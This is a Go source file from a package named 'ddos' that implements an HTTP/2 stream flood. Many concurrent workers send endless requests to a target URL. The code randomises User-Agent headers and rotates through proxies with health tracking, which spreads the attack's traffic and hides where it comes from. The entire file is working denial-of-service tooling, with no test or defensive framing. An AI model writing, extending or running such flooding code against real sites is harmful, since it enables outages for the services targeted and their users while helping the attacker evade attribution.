package ddos

import (
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync/atomic"
	"time"
)

// startHTTP2StreamFlood starts HTTP/2 stream flood attack
func (d *DDoSAttack) startHTTP2StreamFlood() {
	d.startHTTP2StreamFloodWorkers(d.config.MaxThreads)
}

// startHTTP2StreamFloodWorkers starts HTTP/2 stream flood workers
func (d *DDoSAttack) startHTTP2StreamFloodWorkers(numWorkers int) {
	// Determine if we should use TLS (HTTP/2 requires TLS)
	useTLS, _, targetURL := d.shouldUseTLS(d.config.TargetURL)
	if !useTLS && !d.config.ForceTLS {
		// HTTP/2 requires HTTPS, force it
		if strings.HasPrefix(d.config.TargetURL, "http://") {
			targetURL = strings.Replace(d.config.TargetURL, "http://", "https://", 1)
		} else if !strings.HasPrefix(d.config.TargetURL, "https://") {
			targetURL = "https://" + d.config.TargetURL
		}
	}

	transport, err := d.createHTTP2Transport()
	if err != nil {
		return
	}

	// Configure proxy if enabled (single proxy mode)
	if d.config.UseProxy && !d.config.RotateProxy && len(d.proxies) > 0 {
		// Use first proxy for all requests
		if parsedURL, err := url.Parse(d.proxies[0]); err == nil {
			transport.Proxy = http.ProxyURL(parsedURL)
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   d.config.Timeout,
	}

	for i := 0; i < numWorkers; i++ {
		d.wg.Add(1)
		go d.http2StreamFloodWorker(client, targetURL)
	}
}

// http2StreamFloodWorker floods server with HTTP/2 streams
func (d *DDoSAttack) http2StreamFloodWorker(client *http.Client, targetURL string) {
	defer d.wg.Done()

	for {
		select {
		case <-d.ctx.Done():
			return
		default:
			// Create multiple streams per connection
			for i := 0; i < d.config.MaxStreamsPerConn; i++ {
				select {
				case <-d.ctx.Done():
					return
				default:
					d.sendHTTP2StreamRequest(client, targetURL)
				}
			}
		}
	}
}

// sendHTTP2StreamRequest sends a single HTTP/2 stream request
func (d *DDoSAttack) sendHTTP2StreamRequest(client *http.Client, targetURL string) {
	atomic.AddInt64(&d.activeConns, 1)
	defer atomic.AddInt64(&d.activeConns, -1)

	// Create a new client for proxy rotation if needed
	actualClient := client
	var usedProxy string

	if d.config.UseProxy && d.config.RotateProxy {
		// Create a new transport with rotated healthy proxy
		if proxyURL, ok := d.getNextProxy(); ok {
			if parsedURL, err := url.Parse(proxyURL); err == nil {
				usedProxy = proxyURL
				transport, err := d.createHTTP2Transport()
				if err == nil {
					transport.Proxy = http.ProxyURL(parsedURL)
					actualClient = &http.Client{
						Transport: transport,
						Timeout:   d.config.Timeout,
					}
				}
			}
		}
	} else if d.config.UseProxy && !d.config.RotateProxy && len(d.proxies) > 0 {
		// Single-proxy mode: track which proxy is used for health reporting
		proxyURL := d.proxies[0]
		if parsedURL, err := url.Parse(proxyURL); err == nil {
			usedProxy = proxyURL
			transport, err := d.createHTTP2Transport()
			if err == nil {
				transport.Proxy = http.ProxyURL(parsedURL)
				actualClient = &http.Client{
					Transport: transport,
					Timeout:   d.config.Timeout,
				}
			}
		}
	}

	var bodyReader io.Reader
	if d.config.Body != "" {
		bodyReader = strings.NewReader(d.config.Body)
		atomic.AddInt64(&d.bytesSent, int64(len(d.config.Body)))
	}

	req, err := http.NewRequestWithContext(d.ctx, d.config.Method, targetURL, bodyReader)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		return
	}

	// Set headers
	req.Header.Set("User-Agent", d.getRandomUserAgent())
	req.Header.Set("Accept", "*/*")
	for key, value := range d.config.Headers {
		req.Header.Set(key, value)
	}

	startTime := time.Now()
	atomic.AddInt64(&d.requestsSent, 1)

	resp, err := actualClient.Do(req)
	if err != nil {
		atomic.AddInt64(&d.requestsFailed, 1)
		// Track proxy failures for health monitoring
		if usedProxy != "" {
			d.markProxyFailure(usedProxy)
		}
		return
	}
	defer resp.Body.Close()

	// Read response body
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	atomic.AddInt64(&d.bytesReceived, int64(len(body)))

	responseTime := time.Since(startTime)
	atomic.AddInt64(&d.totalResponseTime, int64(responseTime))
	atomic.AddInt64(&d.requestsSuccess, 1)

	// Successful request through a proxy resets its failure counter
	if usedProxy != "" {
		d.markProxySuccess(usedProxy)
	}
}
